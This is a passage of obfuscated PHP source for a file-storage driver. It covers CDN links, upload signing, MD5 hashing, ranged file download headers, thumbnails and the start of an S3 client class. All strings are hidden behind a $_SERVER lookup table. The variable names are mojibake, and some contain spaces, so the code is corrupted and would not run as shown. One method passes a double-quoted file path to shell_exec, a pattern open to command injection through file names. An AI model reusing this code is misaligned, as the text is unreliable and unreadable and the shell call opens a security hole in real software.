²ôƒ[6]][$³ı ²ôƒ[89]][$³ı ²ôƒ[90]]; } public function isFileOutServer() { $à‹“Œú÷ =& $_SERVER[ï»»·÷á]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $à‹“Œú÷[88]) { return !0; } return $GLOBALS[$à‹“Œú÷[6]][$à‹“Œú÷[89]][$à‹“Œú÷[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¢Ò‰ºñ—) { $áğ™Ç¯» =& $_SERVER[ï»»·÷á]; if (!$this->isCdnHost()) { return $¢Ò‰ºñ—; } return str_replace(trim(get_url_root($¢Ò‰ºñ—), $áğ™Ç¯»[8]), trim($this->cdnHost, $áğ™Ç¯»[8]), $¢Ò‰ºñ—); } public function uploadLink($¶ŞŸ¿˜³, $ä™ãá¹ = 0) { $úÍòË„Í =& $_SERVER[ï»»·÷á]; if ($this->isUploadServer()) { return; } $ìÑÇÍÑŒ = $this->getType(); if (!in_array($ìÑÇÍÑŒ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ŒÇÖÀüö = 1024 * 1024 * 10; $Û®óµú‘ = $ä™ãá¹ <= $ŒÇÖÀüö ? $úÍòË„Í[92] : $úÍòË„Í[93]; $‹Ú«æÖ— = (!$ä™ãá¹ ? 1 : ceil($ä™ãá¹ / pow(1024, 3))) * 3600 * 4; $“ŸûÚ· = $this->{$Û®óµú‘}($¶ŞŸ¿˜³, $‹Ú«æÖ—); if ($“ŸûÚ·) { $“ŸûÚ·[$úÍòË„Í[94]] = $¶ŞŸ¿˜³; $“ŸûÚ·[$úÍòË„Í[95]] = $ìÑÇÍÑŒ; } return $“ŸûÚ·; } public function uploadFormData($¡Ô ï¯™, $ñşî¯Õù = 3600) { } public function multiUploadFormData($œĞ¢î¯á, $›šÓÈÓâ = 3600) { } public function download($›ëµ‰€Ö, $‰’¿–’õ) { } public function ext($§ğÆãÇ) { $›‚ßÓûÕ =& $_SERVER[ï»»·÷á]; if (strpos($§ğÆãÇ, $›‚ßÓûÕ[8]) === -1) { $œ·Éã·Î = $§ğÆãÇ; } else { $œ·Éã·Î = $this->pathThis($§ğÆãÇ); } $ ˆ¯ÎŸœ = $›‚ßÓûÕ[12]; if (strstr($œ·Éã·Î, $›‚ßÓûÕ[10])) { $ ˆ¯ÎŸœ = substr($œ·Éã·Î, strrpos($œ·Éã·Î, $›‚ßÓûÕ[10]) + 1); $ ˆ¯ÎŸœ = strtolower($ ˆ¯ÎŸœ); } if (strlen($ ˆ¯ÎŸœ) > 3 && preg_match($›‚ßÓûÕ[96], $ ˆ¯ÎŸœ, $“¾ÆíìË)) { $ ˆ¯ÎŸœ = $›‚ßÓûÕ[12]; } return $ ˆ¯ÎŸœ; } public function pathThis($îŠà‚«Ø) { $¡›Ë¢¯ï =& $_SERVER[ï»»·÷á]; $îŠà‚«Ø = str_replace($¡›Ë¢¯ï[97], $¡›Ë¢¯ï[8], rtrim($îŠà‚«Ø, $¡›Ë¢¯ï[8])); $ê›¡Â¢­ = strrpos($îŠà‚«Ø, $¡›Ë¢¯ï[8]); if ($ê›¡Â¢­ === !1) { return $îŠà‚«Ø; } return substr($îŠà‚«Ø, $ê›¡Â¢­ + 1); } public function pathFather($ã†®±¬ñ) { $Éª¡á¨ö =& $_SERVER[ï»»·÷á]; $ã†®±¬ñ = str_replace($Éª¡á¨ö[97], $Éª¡á¨ö[8], rtrim($ã†®±¬ñ, $Éª¡á¨ö[8])); $Š²Ø†¤ô = strrpos($ã†®±¬ñ, $Éª¡á¨ö[8]); if ($Š²Ø†¤ô === !1) { return $Éª¡á¨ö[12]; } return substr($ã†®±¬ñ, 0, $Š²Ø†¤ô + 1); } public function hashSimple($€‚ĞÂ¡) { $è²ä‘Á‹ =& $_SERVER[ï»»·÷á]; if (!$€‚ĞÂ¡) { return md5($è²ä‘Á‹[12]); } $ˆãµ²û‡ = $this->size($€‚ĞÂ¡); $æ‰ÍëÃ‹ = 200; $‹¡úÚ¡À = 50; if ($ˆãµ²û‡ <= $æ‰ÍëÃ‹ * $‹¡úÚ¡À) { return $this->hashMd5($€‚ĞÂ¡) . $ˆãµ²û‡; } $ÄïŠ§ºÊ = intval($ˆãµ²û‡ / $‹¡úÚ¡À); $Ô€Å¶ = $è²ä‘Á‹[12]; for ($Á’ÇÄØ´ = 0; $Á’ÇÄØ´ < $‹¡úÚ¡À; $Á’ÇÄØ´++) { $Ô€Å¶ .= $this->fileSubstr($€‚ĞÂ¡, $ÄïŠ§ºÊ * $Á’ÇÄØ´, $æ‰ÍëÃ‹); } $Ô€Å¶ .= $this->fileSubstr($€‚ĞÂ¡, $ˆãµ²û‡ - $æ‰ÍëÃ‹, $æ‰ÍëÃ‹); return md5($Ô€Å¶) . $ˆãµ²û‡; } public static $md5Cache = array(); public function hashMd5($¬ÀñÌ°æ) { if (!$¬ÀñÌ°æ) { return md5($_SERVER[ï»»·÷á][12]); } $¬ÀñÌ°æ = $this->iconvSystem($¬ÀñÌ°æ); if (isset(self::$md5Cache[$¬ÀñÌ°æ])) { return self::$md5Cache[$¬ÀñÌ°æ]; } self::$md5Cache[$¬ÀñÌ°æ] = $this->hashMd5Shell($¬ÀñÌ°æ); if (!self::$md5Cache[$¬ÀñÌ°æ]) { self::$md5Cache[$¬ÀñÌ°æ] = @md5_file($¬ÀñÌ°æ); } return self::$md5Cache[$¬ÀñÌ°æ]; } private function hashMd5Shell($ëÇ–ôï¦) { $¥ã‹Ø©Ç =& $_SERVER[ï»»·÷á]; if (!$ëÇ–ôï¦) { return md5($¥ã‹Ø©Ç[12]); } if (!function_exists($¥ã‹Ø©Ç[98])) { return !1; } $Œ’Šûü» = array($¥ã‹Ø©Ç[99], $¥ã‹Ø©Ç[100]); $¥Å¾’£ö = Cache::get($¥ã‹Ø©Ç[101]); if (!$¥Å¾’£ö) { $¦Ò¥†Œ = BASIC_PATH . $¥ã‹Ø©Ç[102]; $ëø•äš¿ = md5_file($¦Ò¥†Œ); $¥Å¾’£ö = $¥ã‹Ø©Ç[103]; foreach ($Œ’Šûü» as $¯Ûô»ä–) { $İ€†œİÃ = shell_exec($¯Ûô»ä– . "\40\42{$¦Ò¥†Œ}\42"); if ($İ€†œİÃ && substr(trim($İ€†œİÃ), 0, 32) == $ëø•äš¿) { $¥Å¾’£ö = $¯Ûô»ä–; break; } } Cache::set($¥ã‹Ø©Ç[101], $¥Å¾’£ö, 3600); } if ($¥Å¾’£ö == $¥ã‹Ø©Ç[103]) { return !1; } $İ€†œİÃ = shell_exec($¥Å¾’£ö . "\40\42{$ëÇ–ôï¦}\42"); $İ€†œİÃ = str_replace($¥ã‹Ø©Ç[104], $¥ã‹Ø©Ç[12], $İ€†œİÃ); return substr($İ€†œİÃ, 0, 32); } public function link($ ğŞÈÓÃ) { return $ ğŞÈÓÃ; } public function fileOut($°Úº£ã•, $¾œî‘ì´ = false, $ÓİŞƒı = false, $ÂÌÖÌ©ï = '') { $ï·„×ä =& $_SERVER[ï»»·÷á]; $this->cacheMethod(null, null); if (!$°Úº£ã• || !$this->exist($°Úº£ã•)) { show_json(LNG($ï·„×ä[105]), !1, $ÓİŞƒı); } $óÓöÄ–Å = $this->getType() == $ï·„×ä[106]; $¬ûıß­‹ = $GLOBALS[$ï·„×ä[6]][$ï·„×ä[89]][$ï·„×ä[107]][$ï·„×ä[108]]; $Ç ¦Æá” = (double) $GLOBALS[$ï·„×ä[6]][$ï·„×ä[89]][$ï·„×ä[107]][$ï·„×ä[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $©ÚÖÛÄ­ = $this->infoFull($°Úº£ã•); $ÃÉ“¬‚Š = $©ÚÖÛÄ­[$ï·„×ä[76]]; $¤±š”¨ı = gmdate($ï·„×ä[110], $©ÚÖÛÄ­[$ï·„×ä[85]]); $ñ•ò–—ı = $ÓİŞƒı ? $ÓİŞƒı : $this->iconvApp($©ÚÖÛÄ­[$ï·„×ä[32]]); $¹¸¬»‘ = 0; $ä¶‡·ËÍ = $ÃÉ“¬‚Š - 1; $”æÈ¨¢é = $this->ext($ñ•ò–—ı); if (in_array($”æÈ¨¢é, array($ï·„×ä[111], $ï·„×ä[112], $ï·„×ä[113], $ï·„×ä[114]))) { $”æÈ¨¢é = $ï·„×ä[115]; } if (in_array($”æÈ¨¢é, array($ï·„×ä[116]))) { $”æÈ¨¢é = $ï·„×ä[117]; } if (!$ÂÌÖÌ©ï) { $ÂÌÖÌ©ï = md5($¤±š”¨ı . $this->hashSimple($°Úº£ã•)); } $ÂÌÖÌ©ï = $ï·„×ä[118] . $ÂÌÖÌ©ï . $ï·„×ä[118]; $‰ùÑ‘²Ñ = get_file_mime($”æÈ¨¢é); $âªó›ç© = !0; $âªó›ç© = isset($_GET[$ï·„×ä[119]]) ? !1 : !0; if ($¾œî‘ì´ === !1 && !mime_support($‰ùÑ‘²Ñ)) { $‰ùÑ‘²Ñ = $ï·„×ä[120]; } header($ï·„×ä[121]); header($ï·„×ä[122] . $‰ùÑ‘²Ñ); $­Ë¼Ş†Ø = rawurlencode($ñ•ò–—ı); $­Ë¼Ş†Ø = $ï·„×ä[118] . $­Ë¼Ş†Ø . $ï·„×ä[123] . $­Ë¼Ş†Ø; if ($¾œî‘ì´) { header($ï·„×ä[124]); header($ï·„×ä[125] . $­Ë¼Ş†Ø); } else { if ($âªó›ç©) { header($ï·„×ä[126] . $­Ë¼Ş†Ø); } } header($ï·„×ä[127] . gmdate($ï·„×ä[110], time() + 3600 * 24 * 30) . $ï·„×ä[128]); header($ï·„×ä[129]); header($ï·„×ä[130]); header($ï·„×ä[131]); if (isset($_SERVER[$ï·„×ä[132]]) && strtotime($_SERVER[$ï·„×ä[132]]) == $©ÚÖÛÄ­[$ï·„×ä[85]]) { header($ï·„×ä[133], !0, 304); die; } if (isset($_SERVER[$ï·„×ä[134]]) && $_SERVER[$ï·„×ä[134]] == $ÂÌÖÌ©ï) { header($ï·„×ä[135] . $ÂÌÖÌ©ï, !0, 304); die; } header($ï·„×ä[135] . $ÂÌÖÌ©ï); header($ï·„×ä[136] . $¤±š”¨ı . $ï·„×ä[128]); header($ï·„×ä[137] . $ñ•ò–—ı); header($ï·„×ä[138]); header($ï·„×ä[139] . $ÃÉ“¬‚Š); header($ï·„×ä[140]); if (!$¾œî‘ì´ && $”æÈ¨¢é == $ï·„×ä[141]) { if ($ÃÉ“¬‚Š > 1024 * 1024 * 5) { die; } $‚˜ãÕä‚ = $this->getContent($°Úº£ã•); $‚˜ãÕä‚ = Html::clearSVG($‚˜ãÕä‚); header($ï·„×ä[142] . strlen($‚˜ãÕä‚)); echo $‚˜ãÕä‚; die; } $µ›í…ãÛ = strtolower($_SERVER[$ï·„×ä[143]]); if ($óÓöÄ–Å && $µ›í…ãÛ && $¬ûıß­‹) { if (strstr($µ›í…ãÛ, $ï·„×ä[144])) { header($ï·„×ä[145] . $°Úº£ã•); } else { if (strstr($µ›í…ãÛ, $ï·„×ä[146])) { header($ï·„×ä[147] . $°Úº£ã•); } else { if (strstr($µ›í…ãÛ, $ï·„×ä[148])) { header($ï·„×ä[149] . $°Úº£ã•); } } } if ($Ç ¦Æá”) { header($ï·„×ä[150] . $Ç ¦Æá”); } return; } if (isset($_SERVER[$ï·„×ä[151]])) { if (preg_match($ï·„×ä[152], $_SERVER[$ï·„×ä[151]], $ù‹Ö’–á)) { $¹¸¬»‘ = intval($ù‹Ö’–á[1]); $¹¸¬»‘ = $¹¸¬»‘ <= 0 ? 0 : ($¹¸¬»‘ >= $ä¶‡·ËÍ ? $ä¶‡·ËÍ : $¹¸¬»‘); if (!empty($ù‹Ö’–á[2])) { $ñóŞ±Ì½ = intval($ù‹Ö’–á[2]); $ä¶‡·ËÍ = $ñóŞ±Ì½ < $¹¸¬»‘ ? $¹¸¬»‘ : ($ñóŞ±Ì½ >= $ä¶‡·ËÍ ? $ä¶‡·ËÍ : $ñóŞ±Ì½); } } header($ï·„×ä[153]); header("\103\157\156\164\x65\x6e\164\x2d\x52\141\156\147\x65\72\x20\142\171\164\x65\x73\40{$¹¸¬»‘}\x2d{$ä¶‡·ËÍ}\x2f" . $ÃÉ“¬‚Š); } else { header($ï·„×ä[154]); } header($ï·„×ä[155]); $ªÍÑşËè = !0; if ($_SERVER[$ï·„×ä[156]] == $ï·„×ä[157] && $ÃÉ“¬‚Š > 1204 * 1024 * 1024 * 2) { $ªÍÑşËè = !1; } if ($ªÍÑşËè) { header($ï·„×ä[158] . ($ä¶‡·ËÍ - $¹¸¬»‘ + 1)); } if ($_SERVER[$ï·„×ä[159]] == $ï·„×ä[160]) { return; } $àïùñ‡¦ = 1024 * 100; $·ş¯»Š = 0; if ($Ç ¦Æá”) { $·ş¯»Š = intval(1000 * 1000 * ($àïùñ‡¦ / $Ç ¦Æá”)); } while ($¹¸¬»‘ <= $ä¶‡·ËÍ) { $êÚ¡—Ôì = timeFloat(); check_abort(); $Ëüàğ©œ = $ä¶‡·ËÍ - $¹¸¬»‘ + 1; if ($Ëüàğ©œ <= $àïùñ‡¦) { $àïùñ‡¦ = $Ëüàğ©œ; } echo $this->fileSubstr($°Úº£ã•, $¹¸¬»‘, $àïùñ‡¦); $¹¸¬»‘ += $àïùñ‡¦; if ($àïùñ‡¦ == $Ëüàğ©œ) { $¹¸¬»‘ = $ä¶‡·ËÍ + 1; } if ($·ş¯»Š) { $°½ «ù = intval(1000 * 1000 * (timeFloat() - $êÚ¡—Ôì)); $³ï†¸Ä¥ = $·ş¯»Š - $°½ «ù; if ($³ï†¸Ä¥ > 5) { usleep($³ï†¸Ä¥); } } } } public function fileOutServer($Ïµøµ…À, $óÜÆ²ë  = false, $”á°‚½é = false, $çË†ºĞı = '') { $this->fileOut($Ïµøµ…À, $óÜÆ²ë , $”á°‚½é, $çË†ºĞı); } public function fileOutLink($ş®Šä±) { header($_SERVER[ï»»·÷á][161] . $ş®Šä±); die; } public function cacheMethod($‹‹Öï˜…, $—ô‘Ş¶°, $¿Ñ„™ïè = null) { $À©Œ¦Í« =& $_SERVER[ï»»·÷á]; static $Å™š†È = array(); $áˆ’†·ø = $—ô‘Ş¶° ? ltrim($this->getPathOuter($—ô‘Ş¶°), $À©Œ¦Í«[8]) : $À©Œ¦Í«[12]; $ĞËçØ¦Î = $À©Œ¦Í«[162] . $‹‹Öï˜… . $À©Œ¦Í«[163] . rtrim($áˆ’†·ø, $À©Œ¦Í«[8]); if (is_null($‹‹Öï˜…)) { $Å™š†È = array(); return; } if (is_null($—ô‘Ş¶°)) { foreach ($Å™š†È as $ĞËçØ¦Î => $ÎùİÊğ÷) { if (!strstr($ĞËçØ¦Î, $À©Œ¦Í«[162] . $‹‹Öï˜… . $À©Œ¦Í«[164])) { continue; } unset($Å™š†È[$ĞËçØ¦Î]); } return; } if (!is_null($¿Ñ„™ïè)) { $Å™š†È[$ĞËçØ¦Î] = $¿Ñ„™ïè; return; } $¤¥Â‘¢ = isset($Å™š†È[$ĞËçØ¦Î]) ? $Å™š†È[$ĞËçØ¦Î] : null; if (!is_null($¤¥Â‘¢)) { return $¤¥Â‘¢; } $¤¥Â‘¢ = $this->{$‹‹Öï˜…}($—ô‘Ş¶°); $Å™š†È[$ĞËçØ¦Î] = $¤¥Â‘¢; return $¤¥Â‘¢; } public function cacheMethodInfoSet($’‚ßôõ, $ä„‘ğƒë, $ÓøÛíÙ = false) { $ı¿…‹İ =& $_SERVER[ï»»·÷á]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ı¿…‹İ[165], $’‚ßôõ, $ä„‘ğƒë); $this->cacheMethod($ı¿…‹İ[166], $’‚ßôõ, $ä„‘ğƒë ? !1 : !0); if (is_array($ÓøÛíÙ)) { $this->cacheMethod($ı¿…‹İ[167], $’‚ßôõ, $ÓøÛíÙ); } } public function fileOutImage($òãÏ²», $‹²±ã¹Ã = 250) { $‡Ï³®š =& $_SERVER[ï»»·÷á]; set_timeout(); if (substr($òãÏ²», 0, 4) == $‡Ï³®š[148]) { $this->fileOutLink($òãÏ²»); } $‡…şçî = $this->info($òãÏ²»); $îı±¨è = $‡…şçî[$‡Ï³®š[32]]; $±²Èšµš = !1; if (isset($GLOBALS[$‡Ï³®š[168]]) && $GLOBALS[$‡Ï³®š[168]][$‡Ï³®š[84]] == $‡…şçî[$‡Ï³®š[84]]) { $†¶óÔ… = $GLOBALS[$‡Ï³®š[168]][$‡Ï³®š[169]]; if (!$‡…şçî[$‡Ï³®š[170]]) { $‡…şçî[$‡Ï³®š[170]] = $GLOBALS[$‡Ï³®š[168]]; } if (isset($†¶óÔ…[$‡Ï³®š[171]])) { if ($†¶óÔ…[$‡Ï³®š[171]] <= $‹²±ã¹Ã && $†¶óÔ…[$‡Ï³®š[172]] <= $‹²±ã¹Ã) { $±²Èšµš = !0; } } $îı±¨è = $‡…şçî[$‡Ï³®š[170]][$‡Ï³®š[32]]; } if ($‡…şçî[$‡Ï³®š[76]] <= 1024 * 50 || $±²Èšµš || !function_exists($‡Ï³®š[173]) || $‡…şçî[$‡Ï³®š[174]] == $‡Ï³®š[175]) { return $this->fileOut($òãÏ²», !1, $îı±¨è); } if (isset($‡…şçî[$‡Ï³®š[170]][$‡Ï³®š[176]])) { $ ¸âºâ = $‡…şçî[$‡Ï³®š[170]][$‡Ï³®š[176]]; } else { if (isset($‡…şçî[$‡Ï³®š[170]][$‡Ï³®š[177]])) { $ ¸âºâ = $‡…şçî[$‡Ï³®š[170]][$‡Ï³®š[177]]; } } if (!$ ¸âºâ) { $ ¸âºâ = md5("{$‡…şçî[$‡Ï³®š[32]]}\137{$‡…şçî[$‡Ï³®š[84]]}\x5f{$‡…şçî[$‡Ï³®š[76]]}\137{$‹²±ã¹Ã}"); } $Ëô‘é = "{$ ¸âºâ}\137{$‹²±ã¹Ã}\56\160\x6e\147"; if (!($×»¤óÁÔ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $‡Ï³®š[178]))) { $Ââë¢¦¦ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $‡Ï³®š[179]); } else { $Ââë¢¦¦ = KodIO::make($×»¤óÁÔ); } if ($×»¤óÁÔ = IO::fileNameExist($Ââë¢¦¦, $Ëô‘é)) { $ù·£¼·§ = KodIO::make($×»¤óÁÔ); return IO::fileOut($ù·£¼·§, !1, $îı±¨è); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ù·£¼·§ = DATA_THUMB . $Ëô‘é; del_file($ù·£¼·§); if (!@file_exists($ù·£¼·§)) { $«Ğ‘ø”ø = TEMP_FILES; if (!is_dir($«Ğ‘ø”ø)) { mk_dir($«Ğ‘ø”ø); } $©®Ë¿Ï™ = $«Ğ‘ø”ø . $ ¸âºâ . $‡Ï³®š[10] . $‡…şçî[$‡Ï³®š[174]]; if (!@file_exists($©®Ë¿Ï™)) { $©®Ë¿Ï™ = $this->download($òãÏ²», $©®Ë¿Ï™); } ImageThumb::createThumb($©®Ë¿Ï™, $ù·£¼·§, $‹²±ã¹Ã, $‹²±ã¹Ã * 10); } if (!file_exists($ù·£¼·§) || filesize($ù·£¼·§) < 100) { return @file_exists($©®Ë¿Ï™) ? IO::fileOut($©®Ë¿Ï™) : $this->fileOut($òãÏ²»); } if (!($¿¡·±•ê = IO::move($ù·£¼·§, $Ââë¢¦¦))) { return IO::fileOut($ù·£¼·§); } del_file($ù·£¼·§); IO::fileOut($¿¡·±•ê); } public function fileOutImageServer($ŠºÅÈ®ñ, $¨Ú«±¢ = 250) { $this->fileOutImage($ŠºÅÈ®ñ, $¨Ú«±¢); } public function fileNameAuto($åæßã´›, $ºçû¬†°, $Ïª§ÁâÔ = REPEAT_RENAME, $Ö¢‚£Ï = false) { $€¨¸öê =& $_SERVER[ï»»·÷á]; $•“Ü£‚ä = $åæßã´› === $€¨¸öê[12] ? $ºçû¬†° : rtrim($åæßã´›, $€¨¸öê[8]) . $€¨¸öê[8] . $ºçû¬†°; if ($Ïª§ÁâÔ == REPEAT_REPLACE || !$this->exist($•“Ü£‚ä) || $Ö¢‚£Ï && $Ïª§ÁâÔ != REPEAT_RENAME_FOLDER) { return $ºçû¬†°; } if ($Ïª§ÁâÔ == REPEAT_SKIP) { return !1; } $Œ‚ñù©£ = $€¨¸öê[10] . get_path_ext($ºçû¬†°); $Œ‚ñù©£ = $Œ‚ñù©£ == $€¨¸öê[10] || $Ö¢‚£Ï ? $€¨¸öê[12] : $Œ‚ñù©£; $êÙä•Ÿë = 1; $ùĞÚÆğ = substr($ºçû¬†°, 0, strlen($ºçû¬†°) - strlen($Œ‚ñù©£)); $•Õ’¬÷ä = $ùĞÚÆğ . "\50{$êÙä•Ÿë}\51{$Œ‚ñù©£}"; while ($this->exist(rtrim($åæßã´›, $€¨¸öê[8]) . $€¨¸öê[8] . $•Õ’¬÷ä)) { $•Õ’¬÷ä = $ùĞÚÆğ . "\x28{$êÙä•Ÿë}\51{$Œ‚ñù©£}"; $êÙä•Ÿë++; } return $•Õ’¬÷ä; } private function fileNameAutoList($ë®ëÅ«Ä, $…‡ğãª, $äÙÕÑàş = false) { $ØşšÕ =& $_SERVER[ï»»·÷á]; $“¦Ä´’ = $this->listPath($ë®ëÅ«Ä, !0); $“¦Ä´’ = array_merge($“¦Ä´’[$ØşšÕ[82]], $“¦Ä´’[$ØşšÕ[83]]); $ô¥ˆşĞ­ = array_to_keyvalue($“¦Ä´’, $ØşšÕ[12], $ØşšÕ[32]); $Şô³ÜâÆ = $ØşšÕ[10] . get_path_ext($…‡ğãª); $Şô³ÜâÆ = $Şô³ÜâÆ == $ØşšÕ[10] || $äÙÕÑàş ? $ØşšÕ[12] : $Şô³ÜâÆ; $šºŠÜ¼‹ = substr($…‡ğãª, 0, strlen($…‡ğãª) - strlen($Şô³ÜâÆ)); $Ñ£©Èˆ” = $šºŠÜ¼‹ . "\x28\x30\51{$Şô³ÜâÆ}"; for ($ØóûÑÕ¾ = 1; $ØóûÑÕ¾ <= count($ô¥ˆşĞ­) + 1; $ØóûÑÕ¾++) { $Ñ£©Èˆ” = $šºŠÜ¼‹ . "\x28{$ØóûÑÕ¾}\51{$Şô³ÜâÆ}"; if (!in_array_not_case($Ñ£©Èˆ”, $ô¥ˆşĞ­)) { return $Ñ£©Èˆ”; } } return $Ñ£©Èˆ”; } public function listAllFiles($İğ«Ô¥, $Äü¬İß) { $±«ãßÅĞ =& $_SERVER[ï»»·÷á]; if (empty($Äü¬İß)) { return array(); } $ë´‘•™ = array_keys($Äü¬İß); $›é©•Ê¶ = array(); $İğ«Ô¥ = trim($İğ«Ô¥, $±«ãßÅĞ[8]); foreach ($Äü¬İß as $Á¢à·×Ş => $£°í¡™ä) { $óÛô¶‡Í = ltrim(substr(trim($Á¢à·×Ş, $±«ãßÅĞ[8]), strlen($İğ«Ô¥)), $±«ãßÅĞ[8]); if (substr($Á¢à·×Ş, -1) == $±«ãßÅĞ[8]) { $óÛô¶‡Í = rtrim($óÛô¶‡Í, $±«ãßÅĞ[8]) . $±«ãßÅĞ[8]; } $›é©•Ê¶ = array_merge($›é©•Ê¶, $this->slicePath($óÛô¶‡Í)); } $öò¤·×û = array(); foreach (array_unique($›é©•Ê¶) as $”µ—Ãø) { $‡é¶èÓº = array($±«ãßÅĞ[84] => $this->getPathOuter($±«ãßÅĞ[8] . $İğ«Ô¥ . $±«ãßÅĞ[8] . $”µ—Ãø), $±«ãßÅĞ[75] => 1, $±«ãßÅĞ[76] => 0); if (substr($”µ—Ãø, -1) != $±«ãßÅĞ[8]) { $‡é¶èÓº[$±«ãßÅĞ[75]] = 0; $¿ä¶ØÍÖ = $this->getPath($İğ«Ô¥ . $±«ãßÅĞ[8] . $”µ—Ãø); if (isset($Äü¬İß[$¿ä¶ØÍÖ])) { $„ë×Ê˜Û = $Äü¬İß[$¿ä¶ØÍÖ]; if (isset($„ë×Ê˜Û[$±«ãßÅĞ[76]])) { $‡é¶èÓº[$±«ãßÅĞ[76]] = intval($„ë×Ê˜Û[$±«ãßÅĞ[76]]); } if (isset($„ë×Ê˜Û[$±«ãßÅĞ[180]])) { $‡é¶èÓº[$±«ãßÅĞ[85]] = intval($„ë×Ê˜Û[$±«ãßÅĞ[180]]); } } } $öò¤·×û[] = $‡é¶èÓº; } return $öò¤·×û; } public function slicePath($°Éİ­ÉÕ) { $ıãÄÅÖñ =& $_SERVER[ï»»·÷á]; $µÒÅÎÀ = explode($ıãÄÅÖñ[8], trim($°Éİ­ÉÕ, $ıãÄÅÖñ[8])); $ğÙ¿û™ª = 0; do { ++$ğÙ¿û™ª; $Æ¯ñ†Ê[] = implode($ıãÄÅÖñ[8], array_slice($µÒÅÎÀ, 0, $ğÙ¿û™ª)) . $ıãÄÅÖñ[8]; } while ($ğÙ¿û™ª < count($µÒÅÎÀ)); $Æ¯ñ†Ê[count($µÒÅÎÀ) - 1] = $°Éİ­ÉÕ; return $Æ¯ñ†Ê; } public function getHost() { $šŸÃ„Ûà =& $_SERVER[ï»»·÷á]; $ÇÂ´Ô¼ò = parse_url(trim($this->domain, $šŸÃ„Ûà[8])); $Ã…Ç å = isset($ÇÂ´Ô¼ò[$šŸÃ„Ûà[181]]) ? $ÇÂ´Ô¼ò[$šŸÃ„Ûà[181]] : http_type(); $“İ ôÜ® = isset($ÇÂ´Ô¼ò[$šŸÃ„Ûà[182]]) ? $ÇÂ´Ô¼ò[$šŸÃ„Ûà[182]] : $ÇÂ´Ô¼ò[$šŸÃ„Ûà[84]]; if (isset($ÇÂ´Ô¼ò[$šŸÃ„Ûà[183]])) { $“İ ôÜ® .= $šŸÃ„Ûà[4] . $ÇÂ´Ô¼ò[$šŸÃ„Ûà[183]]; } return $Ã…Ç å . $šŸÃ„Ûà[184] . $“İ ôÜ®; } public function pathEncode($Í‹Ïç) { $Şİ®¥à =& $_SERVER[ï»»·÷á]; return str_replace($Şİ®¥à[185], $Şİ®¥à[8], rawurlencode($Í‹Ïç)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($œ‹ªäÔ°) { set_timeout(); require_once SDK_DIR . $_SERVER[ï»»·÷á][186]; parent::__construct(); $this->_init($œ‹ªäÔ°); } public function _init($¿Ü¿ªïŸ) { $this->config = $¿Ü¿ªïŸ; foreach ($¿Ü¿ªïŸ as $ğ¢í¹¥• => $Î›àÉŠê) { if (isset($this->{$ğ¢í¹¥•})) { $this->{$ğ¢í¹¥•} = $Î›àÉŠê; } } $this->endpoint = $¿Ü¿ªïŸ[$_SERVER[ï»»·÷á][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ÒèÁúÒì = "\166\x34") { $this->signVer = $ÒèÁúÒì; $this->client->setSignatureVersion($ÒèÁúÒì); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $É§éÂ’© =& $_SERVER[ï»»·÷á]; $±Ø««ùÑ = $this->getBucketCors(); if (!$±Ø««ùÑ || !is_array($±Ø««ùÑ)) { return !1; } if ($±Ø««ùÑ[$É§éÂ’©[188]] != $É§éÂ’©[189] || $±Ø««ùÑ[$É§éÂ’©[190]] != $É§éÂ’©[189]) { return !1; } $¹ÃÂÖúÖ = array_map($É§éÂ’©[191], $±Ø««ùÑ[$É§éÂ’©[192]]); if (!is_array($¹ÃÂÖúÖ)) { $¹ÃÂÖúÖ = array(); } $ôÒÇ¡Ğı = array($É§éÂ’©[193], $É§éÂ’©[194], $É§éÂ’©[195], $É§éÂ’©[196], $É§éÂ’©[197]); $Çš¬¥¬› = array_diff($ôÒÇ¡Ğı, $¹ÃÂÖúÖ); return empty($Çš¬¥¬›); } public function mkfile($“¡İ±‹›, $É³ëòÍÁ = '', $ïñ¢ É = REPEAT_RENAME) { $£ Õ®å = $this->setContent($“¡İ±‹›, $É³ëòÍÁ); if ($£ Õ®å !== !1) { return $this->getPathOuter($“¡İ±‹›); } return !1; } public function mkdir($ŠıÍí², $¼ö™’îä = REPEAT_SKIP) { $õßÊœ±Œ =& $_SERVER[ï»»·÷á]; if (empty($ŠıÍí²) && $ŠıÍí² !== $õßÊœ±Œ[198]) { return !1; } if ($¼ö™’îä && $this->_isFolder($ŠıÍí²)) { return $this->getPathOuter($ŠıÍí²); } $Ø¤ÕµĞÁ = $this->setContent($ŠıÍí², $õßÊœ±Œ[12], !0); if ($Ø¤ÕµĞÁ !== !1) { return $this->getPathOuter($ŠıÍí²); } return !1; } public function copyFile($ŸıÍÚĞÚ, $¸‰öÀ‘ª, $¤ÁØ¤µŸ = array()) { $Üù¯¨Ş =& $_SERVER[ï»»·÷á]; $Ö¹§¹ò = $this->objectMeta($ŸıÍÚĞÚ); if (!$Ö¹§¹ò) { return !1; } if ($Ö¹§¹ò[$Üù¯¨Ş[76]] <= 1024 * 1024 * 200) { $ñ˜ÀÄ× = $this->client->copyObject($this->bucket, $ŸıÍÚĞÚ, $this->bucket, $¸‰öÀ‘ª, $Üù¯¨Ş[199], $¤ÁØ¤µŸ); } else { $ñ˜ÀÄ× = $this->client->multiCopyObject($this->bucket, $ŸıÍÚĞÚ, $this->bucket, $¸‰öÀ‘ª, $¤ÁØ¤µŸ); } $ñ˜ÀÄ× = $ñ˜ÀÄ× ? $this->getPathOuter($¸‰öÀ‘ª) : !1; return $ñ˜ÀÄ×; } public function moveFile($“¿Í’ˆ¸, $ãµËÛªœ) { if 